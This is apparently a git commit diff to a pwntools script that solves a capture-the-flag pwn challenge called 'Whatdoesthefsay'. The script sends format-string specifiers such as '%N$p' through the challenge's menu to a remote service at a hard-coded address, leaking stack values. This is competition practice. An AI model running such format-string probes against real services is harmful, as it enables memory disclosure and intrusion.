d5e53c454cf63f3ba02684a7379936bbdf9f7d4b
szhan21 <shunda.zhang@intel.com>
2023-04-29 21:47:57 +0800

    Solving Whatdoesthefsay.

--- ctf/pwn/Whatdoesthefsay/dec.py
+++ ctf/pwn/Whatdoesthefsay/dec.py
@@ -4,15 +4,16 @@ context.log_level = 'debug'
 
 def detect(io):
 	for i in range(100):
-		if i+1 == 9 or i+1 == 10:
-			continue
-		svar = 'AAAA%'+str(i+1)+'$p'
+		svar = '%'+str(i+1)+'$p'
 		io.recvuntil('2. Space food')
 		io.sendline(b'1')
 		io.recvuntil('3. Deathstar(70.00 s.rocks)')
 		io.sendline(b'2')
 		io.recvuntil('Red or Green Kryptonite?')
 		io.sendline(svar.encode())
+		if i+1 >= 9:
+			io.recvuntil('You have less than 20 space rocks! Are you sure you want to buy it?')
+			io.sendline(b'n')
 
 ip, port = '142.93.34.45', 30123
 io = remote(ip, port)
